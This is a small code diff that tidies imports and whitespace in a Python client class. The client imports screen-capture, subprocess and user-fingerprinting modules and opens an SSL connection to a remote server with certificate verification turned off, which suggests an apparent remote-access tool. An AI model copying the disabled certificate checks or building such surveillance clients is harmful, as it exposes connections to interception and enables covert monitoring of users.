@@ -1,7 +1,6 @@
-import socket, ssl, threading, sys, os, subprocess, _thread
+import socket, ssl, threading, sys, os, subprocess
 import secrets, platform, uuid, datetime
 import shutil, hashlib, mss, mss.tools
-import platform
 from getpass import getuser
 from time import sleep
 
@@ -42,10 +41,10 @@ class Client:
         context = ssl.create_default_context()
         context.check_hostname = False
         context.verify_mode = ssl.CERT_NONE
-        
+
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.secure_sock = context.wrap_socket(sock, server_hostname=self.server_address)
-        
+
         try:
             self.secure_sock.connect((self.server_address, self.server_port))
 
